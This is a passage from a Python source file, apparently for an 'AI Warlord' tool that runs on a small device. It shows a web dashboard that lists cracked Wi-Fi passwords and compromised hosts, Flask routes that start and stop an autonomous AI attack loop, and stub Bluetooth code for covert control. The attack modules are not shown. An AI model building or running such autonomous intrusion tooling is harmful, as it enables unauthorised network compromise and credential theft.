                <!-- Logs will be injected here by JavaScript -->
            </div>
        </div>

        <div class="mb-6">
            <div class="section-title">Cracked Networks</div>
            <div id="cracked-networks-list" class="log-area">
                <p class="text-gray-500">No networks cracked yet.</p>
            </div>
        </div>

        <div class="mb-6">
            <div class="section-title">Compromised Hosts</div>
            <div id="compromised-hosts-list" class="log-area">
                <p class="text-gray-500">No hosts compromised yet.</p>
            </div>
        </div>

    </div>

    <script>
        // JavaScript to fetch and update the dashboard status periodically.
        function fetchStatus() {
            fetch('/status') // Make a GET request to the Flask '/status' endpoint.
                .then(response => response.json()) // Parse the JSON response.
                .then(data => {
                    // Update various dashboard elements with the latest data from `warlord_state`.
                    document.getElementById('overall-status').textContent = data.status;
                    document.getElementById('current-phase').textContent = data.current_phase;
                    document.getElementById('current-target').textContent = data.current_target_ssid;
                    document.getElementById('cracked-count').textContent = Object.keys(data.cracked_networks).length;

                    // Update the live log stream.
                    const logStreamDiv = document.getElementById('log-stream');
                    logStreamDiv.innerHTML = ''; // Clear previous logs.
                    data.log_stream.forEach(log => {
                        const p = document.createElement('p');
                        p.className = 'log-line';
                        p.textContent = log;
                        logStreamDiv.appendChild(p);
                    });
                    logStreamDiv.scrollTop = logStreamDiv.scrollHeight; // Auto-scroll to the bottom of the log.

                    // Update the list of cracked networks.
                    const crackedNetworksList = document.getElementById('cracked-networks-list');
                    crackedNetworksList.innerHTML = '';
                    if (Object.keys(data.cracked_networks).length === 0) {
                        crackedNetworksList.innerHTML = '<p class="text-gray-500">No networks cracked yet.</p>';
                    } else {
                        for (const ssid in data.cracked_networks) {
                            const p = document.createElement('p');
                            p.className = 'log-line';
                            p.textContent = `SSID: ${ssid}, Password: ${data.cracked_networks[ssid]}`;
                            crackedNetworksList.appendChild(p);
                        }
                    }

                    // Update the list of compromised hosts.
                    const compromisedHostsList = document.getElementById('compromised-hosts-list');
                    compromisedHostsList.innerHTML = '';
                    if (Object.keys(data.compromised_hosts).length === 0) {
                        compromisedHostsList.innerHTML = '<p class="text-gray-500">No hosts compromised yet.</p>';
                    } else {
                        for (const ip in data.compromised_hosts) {
                            const host = data.compromised_hosts[ip];
                            const p = document.createElement('p');
                            p.className = 'log-line';
                            p.textContent = `IP: ${ip}, OS: ${host.os || 'Unknown'}, Ports: ${host.ports ? host.ports.join(', ') : 'None'}`;
                            compromisedHostsList.appendChild(p);
                        }
                    }

                    // Update the state of the control buttons (Start/Stop AI).
                    document.getElementById('start-ai-btn').disabled = data.ai_running;
                    document.getElementById('stop-ai-btn').disabled = !data.ai_running;

                })
                .catch(error => console.error('Error fetching status:', error)); // Log any fetch errors.
        }

        // Function to send commands to the Flask backend (e.g., start_ai, stop_ai).
        function sendCommand(command) {
            fetch('/command', {
                method: 'POST', // Use POST request for commands.
                headers: {
                    'Content-Type': 'application/json', // Specify JSON content type.
                },
                body: JSON.stringify({ command: command }), // Send the command as a JSON object.
            })
            .then(response => response.json())
            .then(data => {
                console.log(data.status); // Log the response from the server.
                fetchStatus(); // Refresh the dashboard status after sending a command.
            })
            .catch(error => console.error('Error sending command:', error));
        }

        // Attach event listeners to the Start and Stop buttons.
        document.getElementById('start-ai-btn').addEventListener('click', () => sendCommand('start_ai'));
        document.getElementById('stop-ai-btn').addEventListener('click', () => sendCommand('stop_ai'));

        // Fetch status every 2 seconds to keep the dashboard updated in real-time.
        setInterval(fetchStatus, 2000);
        fetchStatus(); // Initial fetch to populate the dashboard on load.
    </script>
</body>
</html>
"""

@web_app.route('/')
def index():
    """
    Flask route for the root URL ("/").
    Renders the main web dashboard HTML.
    """
    return render_template_string(DASHBOARD_HTML)

@web_app.route('/status')
def get_status():
    """
    Flask route to provide the current operational status of the AI Warlord.
    Returns the `warlord_state` dictionary as a JSON response.
    """
    # Return a copy of warlord_state to prevent potential issues if the dictionary
    # is modified by another thread while being serialized to JSON.
    return jsonify(warlord_state)

@web_app.route('/command', methods=['POST'])
def handle_command():
    """
    Flask route to handle control commands sent from the web dashboard.
    Supports 'start_ai' and 'stop_ai' commands.
    """
    data = request.json # Get JSON data from the POST request body.
    command = data.get('command') # Extract the 'command' field.
    
    if command == "start_ai":
        if not warlord_state["ai_running"]:
            warlord_state["stop_signal"].clear() # Clear any previous stop signals.
            # Start the AI's main loop in a new thread to avoid blocking the web server.
            threading.Thread(target=ai_decision_maker.ai_main_loop, daemon=True).start()
            warlord_state["ai_running"] = True
            update_status("AI Agent Started by UI.", "Running")
            return jsonify({"status": "AI started"}), 200
        return jsonify({"status": "AI already running"}), 409 # Conflict status if already running.
    elif command == "stop_ai":
        if warlord_state["ai_running"]:
            warlord_state["stop_signal"].set() # Set the stop signal for the AI thread.
            warlord_state["ai_running"] = False # Immediately update state for UI feedback.
            update_status("AI Agent Stopping by UI...", "Stopping")
            return jsonify({"status": "AI stopping"}), 200
        return jsonify({"status": "AI not running"}), 409 # Conflict status if not running.
    
    return jsonify({"status": "Unknown command"}), 400 # Bad request for unknown commands.

# --- Module 6: Bluetooth Interface (Conceptual) ---
# This module provides conceptual functions for Bluetooth Low Energy (BLE) communication.
# BLE can be used for discreet control and status updates, allowing interaction
# even while the Wi-Fi interface is busy with attacks.
# Actual implementation would require specific Python BLE libraries (e.g., `bleak`, `pygatt`)
# and system-level Bluetooth services.

class BluetoothInterface:
    def __init__(self):
        """
        Initializes the Bluetooth Interface with a device name and example UUIDs.
        """
        self.ble_device_name = "WarlordAI_BLE"  # The name advertised via Bluetooth.
        # Example UUIDs for BLE services and characteristics.
        # In a real app, these would be custom UUIDs for Warlord-specific functions.
        self.service_uuid = "0000180D-0000-1000-8000-00805F9B34FB"  # Example: Heart Rate Service UUID
        self.char_uuid_control = "00002A37-0000-1000-8000-00805F9B34FB"  # Example: Heart Rate Measurement Characteristic
        # Optional MAC address of a control device to send status updates to.
        # This can be set via the environment variable WARLORD_CONTROL_MAC.
        self.control_device_address = os.environ.get("WARLORD_CONTROL_MAC")

    def advertise_ble(self):
        """
        Starts BLE advertising, making the Warlord device discoverable via Bluetooth.
        This is a conceptual function; actual implementation involves BLE stack APIs.
        """
        update_status(f"Starting BLE advertising as {self.ble_device_name}...", "Bluetooth")
        # This would typically involve:
        # 1. Initializing a BLE adapter.
        # 2. Defining advertisement data (device name, service UUIDs).
        # 3. Starting the advertisement process.
        print("BLE advertising simulated.")

    def start_ble_listener(self):
        """
        Starts a BLE GATT (Generic Attribute Profile) server to listen for
        incoming connections and commands from a connected Bluetooth client.
        This is a conceptual function.
        """
        update_status("Starting BLE command listener...", "Bluetooth")
        # This would involve:
        # 1. Setting up a GATT server with defined services and characteristics.
        # 2. Registering callbacks for characteristic write events (for receiving commands).
        # 3. Starting the BLE event loop to listen for connections.
        print("BLE listener simulated. Waiting for commands...")

    def send_status_via_ble(self, status_data):
        """
        Sends current operational status updates from the Warlord via BLE notifications.
        When a control device MAC address is configured, this method will
        connect to that device and write the status JSON to the configured
        characteristic using the ``bleak`` library.

        Args:
            status_data (dict): A dictionary containing status information to send.
        """
        if not self.control_device_address:
            return  # No known control device to send to.

        async def _send():
            try:
                from bleak import BleakClient

                async with BleakClient(self.control_device_address) as client:
                    payload = json.dumps(status_data).encode()
                    await client.write_gatt_char(self.char_uuid_control, payload)
            except Exception as e:
                update_status(f"BLE send error: {e}", "Error")

        try:
            asyncio.run(_send())
        except RuntimeError:
            loop = asyncio.new_event_loop()
            loop.run_until_complete(_send())
            loop.close()

# Instantiate the Bluetooth Interface module.
bluetooth_interface = BluetoothInterface()

# --- Main Application Entry Point ---
# This block is executed when the Python script is run directly.
if __name__ == "__main__":
    # Start Bluetooth advertising and listener in separate threads.
    # `daemon=True` ensures these threads will exit when the main program exits.
    threading.Thread(target=bluetooth_interface.advertise_ble, daemon=True).start()
    threading.Thread(target=bluetooth_interface.start_ble_listener, daemon=True).start()

    # Start the Flask web server.
    # `host='0.0.0.0'` makes the web server accessible from any device on the network
    # (e.g., your laptop or phone connecting to the M5Stack's IP address).
    # `port=80` is the standard HTTP port.
    # `debug=False` is recommended for production environments.
    update_status("Starting Web Dashboard...", "UI Init")
    web_app.run(host='0.0.0.0', port=80, debug=False)

    # Note: The AI's main loop (`ai_decision_maker.ai_main_loop`) is designed
    # to be started by a user action via the web dashboard's "Start AI Warlord" button.
    # This design allows the user to control when the autonomous operations begin.
